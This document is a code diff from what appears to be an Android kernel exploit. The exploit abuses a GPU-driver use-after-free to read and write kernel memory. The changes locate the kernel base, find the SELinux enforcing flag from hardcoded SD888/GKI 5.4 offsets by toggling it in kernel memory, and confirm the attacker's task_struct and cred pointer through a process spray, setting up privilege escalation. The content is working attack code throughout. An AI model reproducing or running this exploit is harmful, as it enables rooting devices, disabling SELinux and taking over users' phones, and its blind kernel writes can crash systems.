@@ -101,82 +101,74 @@ static int gpu_read_u32(int fd, uint64_t src_va, uint32_t *value);
 static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
     if (kbase == 0) return 0;
     
-    fprintf(stderr, "[SELINUX] Aggressive scan for enforcing bit around base 0x%lx...\n", (unsigned long)kbase);
+    fprintf(stderr, "[SELINUX] Searching for enforcing bit near KBase 0x%lx...\n", (unsigned long)kbase);
     
-    // Anchor search: "selinuxu:object_r"
-    uint64_t rodata_start = kbase + 0x2000000;
-    uint64_t rodata_end = kbase + 0x6000000;
     uint8_t page[4096];
-    uint64_t ctx_str_va = 0;
     uint64_t found_addr = 0;
 
-    for (uint64_t addr = rodata_start; addr < rodata_end; addr += 4096) {
-        if (gpu_read_task_struct(fd, addr, page, 4096) == 0) {
-            // Check for known pattern of selinux_enforcing near other globals
-            // on ROG/SD888 it is often surrounded by 0/1/0/1 flags.
-            uint32_t *u32 = (uint32_t *)page;
-            for (int i = 0; i < 1024; i++) {
-                if (u32[i] == 1) {
-                    // Quick check for neighboring flags (selinux_enabled, etc)
-                    if (i > 0 && i < 1023 && u32[i-1] <= 1 && u32[i+1] <= 1) {
-                         // Double check with a larger read if we have a candidate
-                         uint64_t cand = addr + i * 4;
-                         // selinux_enforcing usually doesn't change randomly
-                         found_addr = cand;
-                         break;
-                    }
-                }
-            }
-            if (found_addr) break;
-
-            for (int i = 0; i < 4096 - 17; i++) {
-                if (memcmp(page + i, "selinuxu:object_r", 17) == 0) {
-                    ctx_str_va = addr + i;
-                    fprintf(stderr, "[SELINUX] Found context string at 0x%lx\n", (unsigned long)ctx_str_va);
-                    break;
+    // 1. Check popular offsets for Android 13 GKI 5.4
+    uint64_t common_offsets[] = { 
+        0x2f74ce8, 0x2f84ce8, 0x2f64ce8, 0x2f54ce8, 
+        0x30f6ce8, 0x32aace8, 0x24d90d0, 0x2f74ce0
+    };
+    for (int i = 0; i < 8; i++) {
+        uint64_t test_va = kbase + common_offsets[i];
+        uint32_t val = 0;
+        if (gpu_read_task_struct(fd, test_va, (uint8_t *)&val, 4) == 0) {
+            if (val == 1) {
+                // Verify by toggling (safest way to confirm it's the right bit)
+                uint32_t zero = 0;
+                gpu_write_task_virt(fd, test_va, (uint8_t*)&zero, 4);
+                uint32_t verify = 1;
+                gpu_read_u32(fd, test_va, &verify);
+                if (verify == 0) {
+                    uint32_t one = 1;
+                    gpu_write_task_virt(fd, test_va, (uint8_t*)&one, 4);
+                    fprintf(stderr, "[SELINUX] FOUND & VERIFIED at 0x%lx (off 0x%lx)\n", 
+                            (unsigned long)test_va, (unsigned long)common_offsets[i]);
+                    return test_va;
                 }
             }
         }
-        if (ctx_str_va) break;
     }
 
-    // SELinux enforcing is usually in the same section as rodata/data
-    // Scan typical SD888 ranges
+    // 2. Scan ranges
     uint64_t scan_ranges[][2] = {
-        {0x2f70000, 0x3000000},
-        {0x30f0000, 0x3100000},
-        {0x2400000, 0x2800000},
-        {0x2b00000, 0x2d00000},
-        {0x3aad000, 0x3ab0000}, // Seen in ROG logs
+        {0x2f00000, 0x3200000},
+        {0x3200000, 0x4000000},
+        {0x2400000, 0x2f00000},
     };
     
-    for (int r = 0; r < 5; r++) {
+    for (int r = 0; r < 3; r++) {
         uint64_t start = kbase + scan_ranges[r][0];
         uint64_t end = kbase + scan_ranges[r][1];
+        fprintf(stderr, "[SELINUX] Scanning range 0x%lx - 0x%lx...", (unsigned long)start, (unsigned long)end);
         
         for (uint64_t addr = start; addr < end; addr += 4096) {
             if (gpu_read_task_struct(fd, addr, page, 4096) == 0) {
-                for (int i = 0; i < 4096; i += 4) {
-                    uint32_t val = *(uint32_t*)(page + i);
-                    if (val == 1) { 
-                         uint64_t cand = addr + i;
-                         // Verify by toggling
-                         uint32_t zero = 0;
-                         gpu_write_task_virt(fd, cand, (uint8_t*)&zero, 4);
-                         uint32_t verify = 1;
-                         gpu_read_u32(fd, cand, &verify);
-                         if (verify == 0) {
-                             fprintf(stderr, "[SELINUX] FOUND & VERIFIED at 0x%lx (off 0x%lx)\n", 
-                                     (unsigned long)cand, (unsigned long)(cand - kbase));
-                             return cand;
-                         }
-                         uint32_t one = 1;
-                         gpu_write_task_virt(fd, cand, (uint8_t*)&one, 4);
+                uint32_t *u32 = (uint32_t *)page;
+                for (int i = 0; i < 1024; i++) {
+                    if (u32[i] == 1) {
+                        uint64_t cand = addr + i * 4;
+                        // Fast verification
+                        uint32_t zero = 0;
+                        gpu_write_task_virt(fd, cand, (uint8_t*)&zero, 4);
+                        uint32_t verify = 1;
+                        gpu_read_u32(fd, cand, &verify);
+                        if (verify == 0) {
+                            uint32_t one = 1;
+                            gpu_write_task_virt(fd, cand, (uint8_t*)&one, 4);
+                            fprintf(stderr, "\n[SELINUX] FOUND via scan at 0x%lx\n", (unsigned long)cand);
+                            return cand;
+                        }
                     }
                 }
             }
+            if ((addr - start) % (1024 * 1024) == 0) fprintf(stderr, ".");
         }
+        fprintf(stderr, "\n");
     }
+    
     return 0;
 }
 
@@ -1498,21 +1490,13 @@ static uint64_t find_kernel_base_from_task_struct(uint8_t *task_data, size_t dat
                 continue;
             if ((test_base & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
                 continue;
-            if (test_base > 0xffffffff00000000ULL)
-                continue;
 
-            uint64_t selinux_test = test_base + SELINUX_OFFSET;
-            uint8_t sdata[8] = {0};
-            if (gpu_read_task_struct(fd, selinux_test, sdata, 8) == 0)
+            uint8_t elf_magic[4];
+            if (gpu_read_task_struct(fd, test_base, elf_magic, 4) == 0)
             {
-                uint64_t sval = *(uint64_t *)sdata;
-                uint32_t sval32 = (uint32_t)(sval & 0xFFFFFFFF);
-                uint32_t shi32 = (uint32_t)(sval >> 32);
-
-                if ((sval32 == 0 || sval32 == 1) && shi32 == 0)
+                if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F')
                 {
-                    fprintf(stderr,
-                            "[KBASE] Found base 0x%lx via ptr 0x%lx\n",
+                    fprintf(stderr, "[KBASE] Found ELF magic at 0x%lx via ptr 0x%lx\n",
                             (unsigned long)test_base, (unsigned long)ptr);
                     return test_base;
                 }
@@ -1843,19 +1827,35 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
             pid_t found_pid = 0;
             if (find_marker_in_page((uint8_t *)dst_vma, PAGE_SIZE, current_va, &found_pid))
             {
-                marker_found = 1;
-                *(uint64_t *)&gbuf[GBUF_TASK_VA] = current_va;
-                *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
+                // Verify task_struct by reading cred
+                uint64_t cred_ptr = 0;
+                gpu_read_task_struct(fd, current_va + OFFSET_CRED, (uint8_t *)&cred_ptr, 8);
                 
-                // Protect target PID from being killed in main loop
-                for (int si = 0; si < SPRAY_COUNT_MAX; si++) {
-                    if (spray_ctrl[si].pid == found_pid) {
-                        spray_ctrl[si].do_action = 1;
-                        break;
+                if ((cred_ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                    uint32_t uids[8];
+                    if (gpu_read_task_struct(fd, cred_ptr, (uint8_t *)uids, 32) == 0) {
+                        uid_t my_uid = getuid();
+                        int match = 0;
+                        for(int j=0; j<8; j++) if(uids[j] == my_uid) match++;
+                        
+                        if (match >= 2) {
+                            marker_found = 1;
+                            *(uint64_t *)&gbuf[GBUF_TASK_VA] = current_va;
+                            *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
+                            *(uint64_t *)&gbuf[GBUF_CRED_PTR] = cred_ptr;
+                            
+                            // Protect target PID
+                            for (int si = 0; si < SPRAY_COUNT_MAX; si++) {
+                                if (spray_ctrl[si].pid == found_pid) {
+                                    spray_ctrl[si].do_action = 1;
+                                    break;
+                                }
+                            }
+                            fprintf(stderr, "\n[!!!] VERIFIED SUCCESS! Task at 0x%lx, PID=%d, CRED=0x%lx\n", 
+                                    (unsigned long)current_va, found_pid, (unsigned long)cred_ptr);
+                        }
                     }
                 }
-                
-                fprintf(stderr, "\n[!!!] SUCCESS! Marker found at 0x%lx, PID=%d\n", (unsigned long)current_va, found_pid);
             }
         }
 
